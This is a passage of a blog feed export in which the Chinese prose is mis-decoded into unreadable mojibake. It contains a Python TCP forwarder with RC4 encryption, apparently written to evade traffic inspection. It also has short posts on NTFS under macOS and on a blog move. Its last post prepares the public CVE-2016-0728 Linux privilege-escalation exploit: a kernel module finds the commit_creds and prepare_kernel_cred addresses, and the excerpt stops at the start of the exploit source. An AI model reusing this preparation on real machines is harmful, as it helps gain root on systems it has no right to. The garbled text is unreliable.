<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket,asyncore,sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line">DEBUG=<span class="literal">False</span></span><br><span class="line">cipher_rc4_obj=<span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transmiter</span>(<span class="params">asyncore.dispatcher</span>):</span>                  <span class="comment">#æ•°æ®äº¤æ¢ç±»</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;æ•°æ®äº¤æ¢ç±»,ä¸¤ä¸ªæ­¤ç±»çš„å®ä¾‹å¯äº’æ¢txå’Œrx,è‹¥åˆå§‹åŒ–socketåˆ™è¡¨ç¤ºserver,å¦åˆ™æ˜¯client&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,socket_info,transmitee=<span class="literal">None</span></span>):</span>     </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;å‚æ•°ä¸ºsocket_info,å¦ä¸€ä¸ªäº¤æ¢å®ä¾‹&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;(ä½œä¸ºclientæ—¶socket_infoä¸ºtuple(ip,port)ï¼Œä½œä¸ºserveræ—¶socket_infoä¸ºacceptå¾—åˆ°çš„socket)&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;ä¾‹å¦‚Transmiter((12.34.56.78,8080),transee)å®ä¾‹åŒ–äº†ä¸€ä¸ªclientç«¯&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;Transmiter(socket_acptd,transee)å®ä¾‹åŒ–äº†ä¸€ä¸ªserverç«¯&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.buf_Tx=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.buf_Rx=<span class="string">&#x27;&#x27;</span>                                              <span class="comment"># Reserved</span></span><br><span class="line">        self.transmitee=transmitee                                  <span class="comment"># transmiteeæ˜¯è¦ä¸ä¹‹äº¤æ¢æ•°æ®çš„å¦ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=transmitee <span class="keyword">and</span> <span class="literal">None</span>==transmitee.transmitee:</span><br><span class="line">            transmitee.transmitee=self                              <span class="comment"># transmiteeä¸æœ¬å®ä¾‹äº¤æ¢æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(socket_info,socket.socket):                   <span class="comment"># server</span></span><br><span class="line">            asyncore.dispatcher.__init__(self,socket_info)</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer server&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">0</span>],<span class="built_in">str</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">1</span>],<span class="built_in">int</span>):</span><br><span class="line">            asyncore.dispatcher.__init__(self)                      <span class="comment"># client</span></span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># å»ºç«‹å¥—æ¥å­—</span></span><br><span class="line">            self.connect(socket_info)                               <span class="comment"># (ip,port)</span></span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer client&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span>                  <span class="comment"># è¯»å¤„ç†:recvå¹¶åŠ å…¥transeeçš„å‘é€é˜Ÿåˆ—æˆ–ä¸¢å¼ƒæ•°æ®</span></span><br><span class="line">        read = self.recv(<span class="number">4096</span>)              <span class="comment"># æœ‰æ•°æ®å¯è¯»æ—¶å°†è¯»å–çš„æ•°æ®åŠ å…¥transeeçš„å‘é€é˜Ÿåˆ—ï¼Œæ— transeeåˆ™ä¸¢å¼ƒ</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            self.transmitee.buf_Tx += read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writable</span>(<span class="params">self</span>):</span>                     <span class="comment"># å¯å†™åˆ¤æ–­:æ£€æµ‹selfçš„å‘é€é˜Ÿåˆ—æ˜¯å¦æœ‰æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(self.buf_Tx) &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_write</span>(<span class="params">self</span>):</span>                 <span class="comment"># å†™å¤„ç†:sendå‘é€é˜Ÿåˆ—ï¼Œä¿ç•™æœªå‘é€æˆåŠŸçš„éƒ¨åˆ†</span></span><br><span class="line">        sent = self.send(self.buf_Tx)</span><br><span class="line">        self.buf_Tx = self.buf_Tx[sent:]</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Write\t%d bytes&#x27;</span> % (sent)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_close</span>(<span class="params">self</span>):</span>                 <span class="comment"># å…³é—­çŠ¶æ€å¤„ç†ï¼Œå…³é—­selfåŠtransee</span></span><br><span class="line">        self.close()                        <span class="comment"># è¿œç«¯å…³é—­åå…³é—­è¿æ¥</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer close&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            self.transmitee.close()</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer\&#x27;s transee close&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_error</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer error occur&#x27;</span></span><br><span class="line">        self.handle_close()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_expt</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer exception occur&#x27;</span></span><br><span class="line">        self.handle_close()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connector</span>(<span class="params"><span class="built_in">object</span></span>):</span>        <span class="comment"># å¦‚æœæ–­å¼€ä¸å¤ªå¥½é‡æ–°å»ºç«‹è¿æ¥</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,remoteaddr1,remoteaddr2</span>):</span></span><br><span class="line">        self.remoteaddr1=remoteaddr1</span><br><span class="line">        self.remoteaddr2=remoteaddr2</span><br><span class="line">        self.trans1=Transmiter(remoteaddr1)</span><br><span class="line">        self.trans2=Transmiter(remoteaddr2,self.trans1)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listener</span>(<span class="params">asyncore.dispatcher</span>):</span>        <span class="comment"># ä¸¤ä¸ªacceptedç»„æˆä¸€å¯¹trans</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,localaddr,backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">        self.lasttrans=<span class="literal">None</span></span><br><span class="line">        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        self.set_reuse_addr()</span><br><span class="line">        self.bind(localaddr)</span><br><span class="line">        self.listen(backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;accepted %s&#x27;</span> % <span class="built_in">str</span>(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>==self.lasttrans:                <span class="comment">#æ²¡æœ‰ä¸Šä¸€ä¸ªtrans</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;wait for another&#x27;</span></span><br><span class="line">            self.lasttrans=Transmiter(conn)     <span class="comment">#è®°å½•æ­¤trans</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;paired to last one&#x27;</span></span><br><span class="line">            Transmiter(conn,self.lasttrans)     <span class="comment">#æœ‰è®°å½•çš„trans,é…å¯¹</span></span><br><span class="line">            self.lasttrans=<span class="literal">None</span>                 <span class="comment">#æ¸…é™¤è®°å½•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forwarder</span>(<span class="params">asyncore.dispatcher</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, localaddr, remoteaddr, backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">        self.remoteaddr=remoteaddr</span><br><span class="line">        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        self.set_reuse_addr()</span><br><span class="line">        self.bind(localaddr)</span><br><span class="line">        self.listen(backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),self.remoteaddr)</span><br><span class="line">        trans_Acptd=Transmiter(conn)</span><br><span class="line">        trans_toRemote=Transmiter(self.remoteaddr,trans_Acptd)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransmiterWithCipher</span>(<span class="params">Transmiter</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,socket_info,cipher_obj=<span class="literal">None</span>,isEnc=<span class="literal">False</span>,transmitee=<span class="literal">None</span></span>):</span></span><br><span class="line">        Transmiter.__init__(self,socket_info,transmitee)</span><br><span class="line">        self.cipher_obj=cipher_obj</span><br><span class="line">        self.isEnc=isEnc</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span></span><br><span class="line">        read = self.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=self.isEnc:</span><br><span class="line">            read=self.cipher_obj.decrypt(read)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            <span class="keyword">if</span> <span class="literal">None</span> != self.transmitee.cipher_obj <span class="keyword">and</span> <span class="literal">False</span>!=self.transmitee.isEnc:</span><br><span class="line">                read = self.transmitee.cipher_obj.encrypt(read)</span><br><span class="line">            self.transmitee.buf_Tx +=read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForwarderWithCipher</span>(<span class="params">Forwarder</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, localaddr, remoteaddr, cipher_obj=<span class="literal">None</span>,localenc=<span class="literal">False</span>,remoteenc=<span class="literal">False</span>,backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        self.cipher_obj=cipher_obj</span><br><span class="line">        self.localenc=localenc</span><br><span class="line">        self.remoteenc=remoteenc</span><br><span class="line">        Forwarder.__init__(self, localaddr, remoteaddr, backlog)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span>(<span class="params">self</span>):</span></span><br><span class="line">        conn, addr = self.accept()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Forward from %s to %s&#x27;</span> % (<span class="built_in">str</span>(addr),self.remoteaddr)</span><br><span class="line">        trans_Acptd=TransmiterWithCipher(conn,self.cipher_obj,self.localenc)</span><br><span class="line">        trans_toRemote=TransmiterWithCipher(self.remoteaddr,self.cipher_obj,self.remoteenc,trans_Acptd)</span><br></pre></td></tr></table></figure>
<p>ç”±äºæ˜¯è§„é¿æµé‡ç‰¹å¾æ‰€ä»¥æ‹¿rc4å‡‘åˆä¸€ä¸‹ï¼Œæ ¹æ®è‡ªå·±çš„è„‘æ´é¡ºæ‰‹å†™äº†ä¸ªConnectorå’ŒListenneræ²¡æœ‰æµ‹è¯•ï¼Œæ‹’ç»å¡«å‘ã€‚æœ€åé€šè¿‡å…¶ä»–è¿æ¥æ¸ é“æŠŠè„šæœ¬éƒ¨åˆ°vpsåå‘ç°ç›´è¿è¿˜æ˜¯ä¼šresetï¼Œä¼°è®¡æ˜¯æ ¡é•¿å¹¶æ²¡æœ‰çœ‹æµé‡ç‰¹å¾ç›´æ¥æŠŠvpsçš„Cæ®µéƒ½æ–­äº†ã€‚ (ï¿£ã¸ï¿£)<br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2FzeW5jb3JlLmh0bWw=" title="https://docs.python.org/2/library/asyncore.html">ref<i class="fa fa-external-link"></i></span></p>
<p>å‘ç°äº†ä¸ªå°å·¥å…·ï¼Œsocatï¼ŒåŠŸèƒ½æŒºå¤šã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>osxè¯»å†™ntfs</title>
    <url>/2016/01/24/2016-01-24/</url>
    <content><![CDATA[<p>ä½œä¸ºå›½é™…å¤§å‚ï¼Œè‹¹æœæ•…æ„ä¸æ”¯æŒå·¨ç¡¬å®¶çš„ntfsæ–‡ä»¶ç³»ç»Ÿæœªå…æœ‰ç‚¹å°å¿ƒçœ¼ã€‚<br>å‡äº†el capitanåå¸Œæ·è‡ªå®¶çš„ntfsæ”¯æŒè½¯ä»¶ä¸èƒ½ç”¨äº†ï¼Œåªå¥½å¯»æ±‚å…¶ä»–å†™å…¥ntfsçš„æ–¹å¼ã€‚<br>googleä¸€ç•ªæ‰¾åˆ°äº†ä¸ªä¸ç®—ä¼˜é›…ä½†è¿˜å‡‘åˆçš„æ–¹æ¡ˆï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p>
<p>æ¥å…¥ntfsç§»åŠ¨ç¡¬ç›˜root shellç¼–è¾‘/etc/fstabå†…å®¹<br>å¦‚ï¼š<br>LABEL=DRIVE_NAME none ntfs rw,auto,nobrowse<br>å…¶ä¸­DRIVE_NAMEæ˜¯è¿å…¥è®¾å¤‡çš„å·æ ‡ï¼Œæ³¨æ„è‹¥å·æ ‡å«ç©ºæ ¼åˆ™ä½¿ç”¨â€œ\ â€è½¬ä¹‰ç¬¦ã€‚<br>æ­¤æ—¶é‡è¿è®¾å¤‡å¯åœ¨/Volumesä¸‹çœ‹åˆ°å·ã€‚<br>è¿™ç§æ–¹æ³•æ— æ³•åœ¨GUIç¯å¢ƒè¯»å†™ç£ç›˜æ–‡ä»¶ï¼Œä½†æ˜¯èƒ½åœ¨ç»ˆç«¯ä¸‹æ“ä½œï¼Œåªèƒ½è¯´å‡‘åˆèƒ½ç”¨ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>åšå®¢è¿ç§»å°è®°</title>
    <url>/2017/08/29/2017-08-29/</url>
    <content><![CDATA[<p>ã€€ã€€ç¿»çœ‹å†å²é‚®ä»¶æƒ³èµ·æ¥å‰æ®µæ—¶é—´farboxå‘bitcronè¿›åŒ–äº†ï¼Œäºæ˜¯æŠ½æ—¶é—´æŠŠåšå®¢ä»æ—§å¹³å°è¿ç§»è¿‡æ¥ï¼Œè¿˜åŠ äº†ä¸ªhttpsã€‚ç”±äºä¹‹å‰ç”¨çš„â€œå¤šè¯´â€è¯„è®ºç³»ç»Ÿå¤±æ•ˆï¼Œå°è¯•äº†ä¸‹disqusï¼Œä¸ç§‘å­¦ä¸Šç½‘è¿è¯„è®ºæ¡†éƒ½çœ‹ä¸åˆ°ã€‚ã€‚ã€‚ã€€ã€€æ¢ç”¨â€œæ¥å¿…ä¹â€è¯•äº†è¯•ï¼Œæ ·å¼å€’æ˜¯ä¸é”™ï¼Œå¯æƒœåŠ è½½å¤ªæ…¢ï¼Œä¹Ÿä¸æ”¯æŒæ—§è¯„è®ºå¯¼å…¥ï¼Œç´¢æ€§å°±æ”¹å›bitcronåŸç”Ÿè¯„è®ºç³»ç»Ÿå§ã€‚åŸç”Ÿè¯„è®ºç³»ç»ŸåŠŸèƒ½æ¯”è¾ƒå•ä¸€ï¼Œå¥½åœ¨æ ¼å¼æ¯”è¾ƒç®€å•ï¼Œæ‰‹åŠ¨æŠŠä»¥å‰å¤šè¯´çš„jsonæ”¹æˆcsvåŒæ­¥äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬æ¢å¤è¿ç§»å‰çš„æ ·å­ã€‚</p>
<p>ã€€ã€€è¯´èµ·æ¥ä¹Ÿæœ‰ä¸€å¹´å¤šæ²¡å†™ç‚¹ä¸œè¥¿äº†ï¼Œbitcronï¼Œè¿˜æ˜¯è¦cronçš„ï¼Œè¿‡å‡ å¤©è®°å½•ä¸€ä¸‹èƒ½å›æƒ³èµ·æ¥çš„äº‹æƒ…å§ã€‚</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>çœ‹çœ‹CVE-2016-0728</title>
    <url>/2016/01/27/2016-01-27/</url>
    <content><![CDATA[<p>ä¸Šå‘¨æœ«çœ‹äº†ä¸‹<strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">cve-2016-0728<i class="fa fa-external-link"></i></span></strong> linuxæœ¬åœ°ææƒæ¼æ´ï¼Œä»Šå¤©è®°å½•ä¸€ä¸‹ã€‚<br>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯å› ä¸ºkeyringså†…æ ¸ç»„ä»¶çš„å¼•ç”¨æ³„éœ²å¼•èµ·çš„ã€‚<br>æ­¤å†…æ ¸å¯¹è±¡é‡‡ç”¨ä¸€ä¸ª32ä½æ— ç¬¦å·æ•´æ•°åšå¼•ç”¨è®¡æ•°ï¼Œä½†åœ¨å¼•ç”¨è®¡æ•°æº¢å‡ºçš„æ—¶å€™æ²¡æœ‰è¿›è¡Œåˆç†çš„é”™è¯¯å¤„ç†ï¼Œæ‰€ä»¥å½“å¯¹æ­¤å¯¹è±¡å¼•ç”¨åˆ°è¾¾4Gæ—¶ä¼šä½¿å¼•ç”¨è®¡æ•°å›åˆ°0ï¼Œå†…æ ¸åœ¨æ£€æµ‹åˆ°æ­¤å¼•ç”¨è®¡æ•°ä¸º0æ—¶ä¼šææ„å¯¹è±¡é‡Šæ”¾ç©ºé—´ã€‚è€Œæ­¤æ—¶r3ç¨‹åºè¿˜ä¿ç•™æœ‰å†…æ ¸å¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æ­¤å°±å½¢æˆäº†ä¸€ä¸ªUAFæ¼æ´ã€‚<br>å°è±¡ä¸­è¿™ç§æ•´å½¢æº¢å‡ºé€ æˆçš„ä¸¥é‡æ¼æ´è¿˜çœŸä¸å°‘ï¼Œæœ¬ç€å®è·µå‡ºçœŸçŸ¥çš„æ€åº¦å®è·µä¸€ä¸‹ã€‚<br><strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">åŸæ–‡<i class="fa fa-external-link"></i></span></strong>ä¸­æåˆ°ï¼š<br>â€œAddresses of commit_creds and prepare_kernel_cred functions are static and can be determined per Linux kernel version/android device.â€<br>æ‰€ä»¥å…ˆå†™äº†ä¸ªå†…æ ¸æ¨¡å—è·å–è¿™ä¿©å‡½æ•°çš„åœ°å€ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">find_symbol_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">find_symbol_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//æ¨¡å—åŠ è½½å‡½æ•°ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">find_symbol_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * name1= <span class="string">&quot;prepare_kernel_cred&quot;</span>;	<span class="comment">//å¾…æŸ¥æ‰¾çš„å†…æ ¸ç¬¦å·çš„åå­—</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> * name2= <span class="string">&quot;commit_creds&quot;</span>;		<span class="comment">//å¾…æŸ¥æ‰¾çš„å†…æ ¸ç¬¦å·çš„åå­—</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> * <span class="title">ksymbol</span> ;</span>  		<span class="comment">// ç”¨äºæ¥æ”¶æµ‹è¯•å‡½æ•°è¿”å›å€¼</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> * <span class="title">owner</span>;</span>            		<span class="comment">// å†…æ ¸ç¬¦å·æ‰€å±çš„æ¨¡å—</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *crc;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name[<span class="number">2</span>]=&#123;name1,name2&#125;;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)&#123;</span><br><span class="line">		<span class="keyword">bool</span> gplok = <span class="literal">true</span>;                		<span class="comment">// æ¨¡å—æ”¯æŒGPL è®¸å¯</span></span><br><span class="line">		<span class="keyword">bool</span> warn = <span class="literal">true</span>;                 		<span class="comment">// å…è®¸è¾“å‡ºè­¦å‘Šä¿¡æ¯</span></span><br><span class="line">		ksymbol = find_symbol(*(name+i),&amp;owner,&amp;crc,gplok,warn);     <span class="comment">//è°ƒç”¨å¾…æµ‹è¯•å‡½æ•°</span></span><br><span class="line">		<span class="keyword">if</span>( ksymbol != <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*è¾“å‡ºæŸ¥æ‰¾åˆ°çš„å†…æ ¸ç¬¦å·åœ¨å†…å­˜ä¸­çš„åœ°å€*/</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;value : %lx\n&quot;</span>,ksymbol-&gt;value);</span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;name : %s\n&quot;</span>,ksymbol-&gt;name);   <span class="comment">//è¾“å‡ºå†…æ ¸ç¬¦å·åå­—</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;Failed to find symbol %s\n&quot;</span>, *(name+i));</span><br><span class="line">		<span class="keyword">if</span>( owner != <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*è¾“å‡ºå†…æ ¸ç¬¦å·æ‰€å±çš„æ¨¡å—çš„åå­—*/</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt; owner-&gt;name : %s\n&quot;</span>,owner-&gt;name);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>( crc != <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*  è¾“å‡ºå†…æ ¸ç¬¦å·çš„crc å€¼æ‰€åœ¨çš„åœ°å€*/</span></span><br><span class="line">			printk(<span class="string">&quot;&lt;0&gt;*crc : %lx\n&quot;</span>,*crc);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¨¡å—é€€å‡ºå‡½æ•°ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">find_symbol_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	printk(<span class="string">&quot;&lt;0&gt;module exit ok!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ¨¡å—åŠ è½½ã€é€€å‡ºå‡½æ•°è°ƒç”¨ï¼š</span></span><br><span class="line">module_init(find_symbol_init);</span><br><span class="line">module_exit(find_symbol_exit);</span><br></pre></td></tr></table></figure>
<p>Googleäº†ä¸€ç•ªå°†å…¶ç¼–è¯‘æˆkoæ–‡ä»¶ï¼Œå†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> åŠ è½½</span></span><br><span class="line">insmod find_symbol.ko</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å¸è½½</span></span><br><span class="line">rmmod find_symbol</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹è¾“å‡º</span></span><br><span class="line">dmesg</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p>

<p>æ ¹æ®è·å–åˆ°çš„ä¸¤ä¸ªå‡½æ•°åœ°å€ä¿®æ”¹<strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">åŸæ–‡<i class="fa fa-external-link"></i></span></strong>ä¸­çš„ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f */</span></span><br><span class="line"><span class="comment">/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */</span></span><br><span class="line"><span class="comment">/* $ ./cve_2016_072 PP_KEY */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 